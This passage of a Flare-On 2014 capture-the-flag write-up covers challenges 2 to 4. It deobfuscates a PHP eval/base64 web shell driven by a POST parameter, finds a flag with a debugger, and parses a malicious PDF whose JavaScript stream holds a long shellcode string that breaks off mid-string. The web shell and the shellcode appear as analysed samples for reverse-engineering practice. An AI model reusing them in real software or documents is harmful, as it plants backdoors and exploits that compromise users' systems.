</span><span class='line'><span class="err">$</span><span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;=</span><span class="err">’</span><span class="nx">JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7</span><span class="err">’</span><span class="p">;</span>
</span><span class='line'><span class="err">$</span><span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;&lt;/</span><span class="nx">em</span><span class="o">&gt;=</span><span class="err">”</span><span class="nx">\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65</span><span class="err">”</span><span class="p">;</span> <span class="c1">// base64&lt;em&gt;decode</span>
</span><span class='line'><span class="k">eval</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Contents of <code>$_</code> and <code>$__</code> are clearly encoded in <code>base64</code> and  <code>$___</code> is <code>base64_decode</code>. Base64 can be decoded in Python by calling <code>base64.b64decode</code>.
Line #4 can be re-written as </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="err">‘</span><span class="nx">JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7</span><span class="err">’</span><span class="p">));</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">result</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nv">$code</span><span class="o">=</span><span class="nx">base64</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">decode</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="p">);</span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>So it must decode the first base64 blob and eval it. Let’s decode it:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="err">“</span><span class="nx">\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D</span><span class="err">”</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="err">“</span><span class="nx">\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D</span><span class="err">”</span><span class="p">]));</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let’s print them using Python and hope this is the last encoding:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mylist</span><span class="o">=</span> <span class="p">[</span><span class="mi">97</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mh">0x4F</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x4F</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x6D</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="err">‘‘</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">item</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">mylist</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Fortunately, we are done.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a11DOTthatDOTjava5crapATflareDASHonDOTcom
</span><span class='line'>or
</span><span class='line'>a11.that.java5crap@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech3a-challenge-3---cheating-my-way-to-the-top"><a name="ch3"></a> Challenge 3 - Cheating My Way to the Top</h2>

<p><code>
Nice job, you're really knocking these out! Here's the next binary. The password to the zip archive is "malware" again.
Keep up the good work, and good luck!
-FLARE
</code></p>

<p>Challenge 3 is a Win32 binary called <code>such_evil</code>. <code>PE-Studio</code> does not tell us much.</p>

<p>Running it will result in this message:</p>

<p><img src="/images/2014/flare/3-1.jpg" alt="BrokenByte" title="BrokenByte" /></p>

<p>I cheated in this challenge. I just dropped the executable in <code>Immunity Debugger</code>, ran it and looked in memory when the message box popped up and the email was there:</p>

<p><img src="/images/2014/flare/3-2.jpg" alt="Flag in memory" title="Flag in memory" /></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 3 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>such.5h311010101@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech4a-challenge-4---things-are-getting-cereal"><a name="ch4"></a> Challenge 4 - Things are Getting Cereal</h2>

<p><code>
Well done! Such dedication, much work, wow.
Here's the next challenge, password is the same as last time. We'll talk more when you figure it out.
-FLARE
</code></p>

<p>It’s a two page PDF name <code>APT9001.pdf</code>. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a <code>HxD</code> but it won’t tell us much.
There are tools that will help us parse the PDF. I used <code>pyew</code>. You can find a good tutorial for PDF analysis <a href="https://code.google.com/p/pyew/wiki/PDFAnalysis">here</a>.<br />
Let’s follow the tutorial:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>pyew output for the PDF </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;$</span> <span class="n">python</span> <span class="n">pyew</span><span class="p">.</span><span class="n">py</span> <span class="n">APT9001</span><span class="p">.</span><span class="n">pdf</span>
</span><span class='line'><span class="n">PDF</span> <span class="n">File</span><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">PDFiD</span> <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">11</span> <span class="n">APT9001</span><span class="p">.</span><span class="n">pdf</span>
</span><span class='line'> <span class="n">PDF</span> <span class="n">Header</span><span class="err">:</span> <span class="k">%</span><span class="n">PDF</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">5</span>
</span><span class='line'> <span class="n">obj</span>                   <span class="n">10</span>
</span><span class='line'> <span class="n">endobj</span>                 <span class="n">9</span>
</span><span class='line'> <span class="n">stream</span>                 <span class="n">3</span>
</span><span class='line'> <span class="n">endstream</span>              <span class="n">3</span>
</span><span class='line'> <span class="n">xref</span>                   <span class="n">2</span>
</span><span class='line'> <span class="n">trailer</span>                <span class="n">2</span>
</span><span class='line'> <span class="n">startxref</span>              <span class="n">2</span>
</span><span class='line'> <span class="p">/</span><span class="n">Page</span>                  <span class="n">3</span><span class="p">(</span><span class="n">2</span><span class="p">)</span>
</span><span class='line'> <span class="p">/</span><span class="n">Encrypt</span>               <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">ObjStm</span>                <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">JS</span>                    <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class='line'> <span class="p">/</span><span class="n">JavaScript</span>            <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class='line'> <span class="p">/</span><span class="n">AA</span>                    <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">OpenAction</span>            <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class='line'> <span class="p">/</span><span class="n">AcroForm</span>              <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">JBIG2Decode</span>           <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class='line'> <span class="p">/</span><span class="n">RichMedia</span>             <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">Launch</span>                <span class="n">0</span>
</span><span class='line'> <span class="p">/</span><span class="n">Colors</span> <span class="p">&amp;</span><span class="n">gt</span><span class="err">;</span> <span class="n">2</span><span class="p">^</span><span class="n">24</span>         <span class="n">0</span>
</span><span class='line'> <span class="p">%</span><span class="k">%</span><span class="n">EOF</span>                  <span class="n">1</span>
</span><span class='line'> <span class="n">After</span> <span class="n">last</span> <span class="p">%</span><span class="k">%</span><span class="n">EOF</span>       <span class="n">0</span>
</span><span class='line'> <span class="n">Total</span> <span class="n">entropy</span><span class="err">:</span>           <span class="n">7</span><span class="p">.</span><span class="n">862012</span> <span class="p">(</span>     <span class="n">21284</span> <span class="n">bytes</span><span class="p">)</span>
</span><span class='line'> <span class="n">Entropy</span> <span class="n">inside</span> <span class="n">streams</span><span class="err">:</span>  <span class="n">7</span><span class="p">.</span><span class="n">890539</span> <span class="p">(</span>     <span class="n">19723</span> <span class="n">bytes</span><span class="p">)</span>
</span><span class='line'> <span class="n">Entropy</span> <span class="n">outside</span> <span class="n">streams</span><span class="err">:</span> <span class="n">4</span><span class="p">.</span><span class="n">745484</span> <span class="p">(</span>      <span class="n">1561</span> <span class="n">bytes</span><span class="p">)&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">h1</span> <span class="n">id</span><span class="p">=</span><span class="s2">&quot;first-512-bytes-of-the-pdf-removed&quot;</span><span class="p">&gt;</span><span class="n">first</span> <span class="n">512</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">the</span> <span class="n">PDF</span> <span class="n">removed</span><span class="p">&lt;/</span><span class="n">h1</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">h1</span> <span class="n">id</span><span class="p">=</span><span class="s2">&quot;to-list-the-streams-that-are-encoded-and-see-what-filters-the-stream-is-using-type-pdfilter&quot;</span><span class="p">&gt;</span><span class="n">To</span> <span class="n">list</span> <span class="n">the</span> <span class="n">streams</span> <span class="n">that</span> <span class="n">are</span> <span class="n">encoded</span> <span class="n">and</span> <span class="n">see</span> <span class="n">what</span> <span class="n">filters</span> <span class="n">the</span> <span class="n">stream</span> <span class="n">is</span> <span class="n">using</span> <span class="n">type</span> <span class="err">“</span><span class="n">pdfilter</span><span class="err">”:</span><span class="p">&lt;/</span><span class="n">h1</span><span class="p">&gt;</span>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;[</span><span class="n">0x00000000</span><span class="p">]&amp;</span><span class="n">gt</span><span class="err">;</span> <span class="n">pdfilter</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">1</span> <span class="n">uses</span> <span class="n">FlateDecode</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">1</span> <span class="n">uses</span> <span class="n">ASCIIHexDecode</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">FlateDecode</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">ASCIIHexDecode</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">JBIG2Decode</span>
</span><span class='line'><span class="n">Stream</span> <span class="n">3</span> <span class="n">uses</span> <span class="n">FlateDecode</span><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Seems like streams 1,2 and 3 are interesting. According to the tutorial <code>pdfvi</code> displays them.</p>

<ul>
  <li>FlateDecode: Decompress. In Python do <code>zlib.decompress</code></li>
  <li>ASCIIHexDecode: Decode from ASCII Hex</li>
  <li>JBIG2Decode: Decode as a black and white image</li>
</ul>

<p>What really threw me off was the <code>JBIG2Decode</code> decoder for stream 2. There was a <a href="http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html">vulnerability</a> associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). <code>Pyew</code> also displays the disassembly but it is not shellcode either (if it is, then I didn’t recognize it). It is also not an image (hence the <code>JBIG2Decode</code> filter).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Stream 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">FlateDecode</span> <span class="err">…</span>
</span><span class='line'><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">ASCIIHexDecode</span> <span class="err">…</span>
</span><span class='line'><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">JBIG2Decode</span> <span class="err">…</span>
</span><span class='line'><span class="nf">Encoded</span> <span class="nv">Stream</span> <span class="mi">2</span>
</span><span class='line'><span class="err">——————————————————————————–</span>
</span><span class='line'><span class="err">0000</span>   <span class="err">00</span> <span class="err">20</span> <span class="err">50</span> <span class="nf">FF</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">69</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">05</span> <span class="mi">69</span> <span class="mi">50</span> <span class="mi">50</span>          <span class="nv">.</span> <span class="nv">P.@..i</span><span class="err">…</span><span class="nv">iPP</span>
</span><span class='line'><span class="err">——————————————————————————–&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">Show</span> <span class="nb">di</span><span class="nv">sassembly</span> <span class="p">(</span><span class="nv">y</span><span class="o">/</span><span class="nv">n</span><span class="p">)</span><span class="nv">?</span> <span class="p">[</span><span class="nv">n</span><span class="p">]:</span> <span class="nv">y</span>
</span><span class='line'><span class="err">0</span><span class="nf">x00000000</span> <span class="p">(</span><span class="mi">02</span><span class="p">)</span> <span class="mi">0020</span>                 <span class="nv">ADD</span> <span class="p">[</span><span class="nb">EAX</span><span class="p">],</span> <span class="nb">AH</span>
</span><span class='line'><span class="err">0</span><span class="nf">x00000002</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span>
</span><span class='line'><span class="err">0</span><span class="nf">x00000003</span> <span class="p">(</span><span class="mi">03</span><span class="p">)</span> <span class="nv">ff40</span> <span class="mi">00</span>              <span class="nv">INC</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">EAX</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
</span><span class='line'><span class="err">0</span><span class="nf">x00000006</span> <span class="p">(</span><span class="mi">03</span><span class="p">)</span> <span class="mi">0069</span> <span class="mi">00</span>              <span class="nv">ADD</span> <span class="p">[</span><span class="nb">ECX</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span> <span class="nb">CH</span>
</span><span class='line'><span class="err">0</span><span class="nf">x00000009</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">00</span>                   <span class="nv">DB</span> <span class="mh">0x0</span>
</span><span class='line'><span class="err">0</span><span class="nf">x0000000a</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">05</span>                   <span class="nv">DB</span> <span class="mh">0x5</span>
</span><span class='line'><span class="err">0</span><span class="nf">x0000000b</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">69</span>                   <span class="nv">DB</span> <span class="mh">0x69</span>
</span><span class='line'><span class="err">0</span><span class="nf">x0000000c</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span>
</span><span class='line'><span class="err">0</span><span class="nf">x0000000d</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Let’s take a look at stream 1 using <code>pdfvi</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Stream 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">[</span><span class="mh">0x00000000</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">pdfvi</span>
</span><span class='line'><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">FlateDecode</span> <span class="err">…</span>
</span><span class='line'><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">ASCIIHexDecode</span> <span class="err">…</span>
</span><span class='line'><span class="nx">Encoded</span> <span class="nx">Stream</span> <span class="mi">1</span>
</span><span class='line'><span class="err">——————————————————————————–</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">HdPN</span> <span class="o">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">=</span> <span class="err">“”</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="c1">// important</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">IxTUQnOvHg</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139% ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9 ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412 d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478% u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub 7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7 e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471% u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4 190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3% uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7 69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb 0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748% u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4 879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881 4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf% ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7 b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257 7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76% u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4 1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317 4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9% ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue 3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b 9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233% u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0 27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033 c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074% uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8 b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726 2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54% u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2 c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31 6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f% 